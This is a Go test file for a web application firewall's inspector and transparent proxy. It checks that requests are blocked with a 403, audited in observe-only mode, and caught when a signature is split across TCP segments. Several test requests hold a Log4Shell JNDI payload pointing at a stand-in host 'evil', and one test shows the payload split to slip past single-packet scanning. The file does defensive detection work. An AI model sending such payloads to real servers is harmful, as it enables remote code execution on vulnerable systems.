package waf

import (
	"bufio"
	"context"
	"net"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestBuiltinInspector(t *testing.T) {
	in := NewBuiltinInspector()
	// A Log4Shell payload anywhere in the head blocks, naming the rule.
	v := in.Inspect([]byte("GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\n\r\n"))
	if !v.Block || v.RuleName != "log4shell-jndi" || v.RuleID == 0 {
		t.Fatalf("expected log4shell block, got %+v", v)
	}
	// A benign request passes.
	if v := in.Inspect([]byte("GET /health HTTP/1.1\r\nHost: x\r\n\r\n")); v.Block {
		t.Fatalf("benign request blocked: %+v", v)
	}
}

// startInspectingProxy wires a proxy with the given inspector/enforce in front of
// an echo upstream and returns the proxy's listen address.
func startInspectingProxy(t *testing.T, enforce bool, onBlock func(string, Verdict, bool)) (proxyAddr string) {
	t.Helper()
	echo := echoServer(t)
	t.Cleanup(func() { _ = echo.Close() })

	proxyLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = proxyLn.Close() })

	p := &TransparentProxy{
		OrigDst:      func(net.Conn) string { return echo.Addr().String() },
		Inspector:    NewBuiltinInspector(),
		EnforceBlock: enforce,
		OnBlock:      onBlock,
	}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	go func() { _ = p.Serve(ctx, proxyLn) }()
	return proxyLn.Addr().String()
}

// TestInspect_EnforceBlocks: an exploit request is refused (403) and never
// reaches the upstream.
func TestInspect_EnforceBlocks(t *testing.T) {
	var (
		mu      sync.Mutex
		blocked []Verdict
	)
	addr := startInspectingProxy(t, true, func(_ string, v Verdict, _ bool) {
		mu.Lock()
		blocked = append(blocked, v)
		mu.Unlock()
	})

	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()
	_, _ = conn.Write([]byte("GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\nHost: t\r\n\r\n"))

	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	line, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(line, "403") {
		t.Fatalf("expected a 403, got %q", line)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(blocked) != 1 || blocked[0].RuleName != "log4shell-jndi" {
		t.Fatalf("OnBlock = %+v, want one log4shell verdict", blocked)
	}
}

// TestInspect_ObserveOnlyForwards: observe-only mode audits the match but still
// forwards (the echo comes back), so a false positive can't break traffic during
// a soak.
func TestInspect_ObserveOnlyForwards(t *testing.T) {
	var audited int
	var mu sync.Mutex
	addr := startInspectingProxy(t, false, func(string, Verdict, bool) { mu.Lock(); audited++; mu.Unlock() })

	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()
	payload := "GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\nHost: t\r\n\r\n"
	_, _ = conn.Write([]byte(payload))

	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, len(payload))
	n, err := conn.Read(buf)
	if err != nil || string(buf[:n]) != payload {
		t.Fatalf("observe-only should forward the request to the echo upstream; got n=%d err=%v", n, err)
	}
	mu.Lock()
	defer mu.Unlock()
	if audited != 1 {
		t.Fatalf("observe-only should still audit the match once, got %d", audited)
	}
}

// TestInspect_MultiSegmentReassembly is the value-over-Tier-2 case: the signature
// is SPLIT across two TCP writes (segments). The in-kernel single-packet scan
// can't catch this; the userspace inspector reassembles the head and does.
func TestInspect_MultiSegmentReassembly(t *testing.T) {
	var blocked bool
	var mu sync.Mutex
	addr := startInspectingProxy(t, true, func(string, Verdict, bool) { mu.Lock(); blocked = true; mu.Unlock() })

	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()
	// Split "${jndi:" across two segments with a gap between them.
	_, _ = conn.Write([]byte("GET /?x=${jn"))
	time.Sleep(50 * time.Millisecond)
	_, _ = conn.Write([]byte("di:ldap://evil/a} HTTP/1.1\r\nHost: t\r\n\r\n"))

	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	line, _ := bufio.NewReader(conn).ReadString('\n')
	if !strings.Contains(line, "403") {
		t.Fatalf("split-segment exploit not blocked (got %q) — reassembly failed", line)
	}
	mu.Lock()
	defer mu.Unlock()
	if !blocked {
		t.Fatal("expected a block on the reassembled split signature")
	}
}
